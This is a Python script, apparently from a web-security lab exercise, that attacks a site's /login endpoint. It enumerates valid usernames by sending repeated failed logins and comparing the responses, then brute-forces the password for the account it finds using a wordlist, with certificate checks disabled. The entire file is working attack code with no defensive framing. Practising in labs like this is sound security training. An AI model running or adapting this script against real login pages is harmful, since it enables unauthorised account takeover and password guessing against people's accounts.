import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def account_log(session, url, user_list):
    username = ""
    pattern = ""
    is_ok = True
    
    for user in user_list:
        for _ in range(5):
            data = {"username": user, "password": f"{None}"}
            try:
                res = session.post(url + "/login", data=data, verify=False)
            except requests.exceptions.RequestException as e:
                print(f"Request error: {e}")
                continue

            if is_ok:
                pattern = res.text
                is_ok = False

            if pattern != res.text:
                username = user
                break
            else:
                sys.stdout.write("\r" + user)
                sys.stdout.flush()

            pattern = res.text

    return username

def auth_exploit(session, url, username, password_list):
    password = ""
    
    for password in password_list:
        data = {"username": username, "password": password}
        try:
            res = session.post(url + "/login", data=data, verify=False)
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
            continue

        if "Invalid username or password" not in res.text:
            password = password
            break
        else:
            sys.stdout.write("\r" + username + " ~~~ " + password)
            sys.stdout.flush()

    return password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    user_list = []
    password_list = []
    
    user_file_path = r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\users.txt'
    password_file_path = r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt'
    
    with open(user_file_path, "r", encoding="utf-8") as user_file:
        user_list = user_file.read().splitlines()
    
    with open(password_file_path, "r", encoding="utf-8") as password_file:
        password_list = password_file.read().splitlines()
    
    session = requests.Session()
    username = account_log(session, url, user_list)
    print("\nThe username is: " + username)
    password = auth_exploit(session, url, username, password_list)
    print(username + " ~~~ " + password)
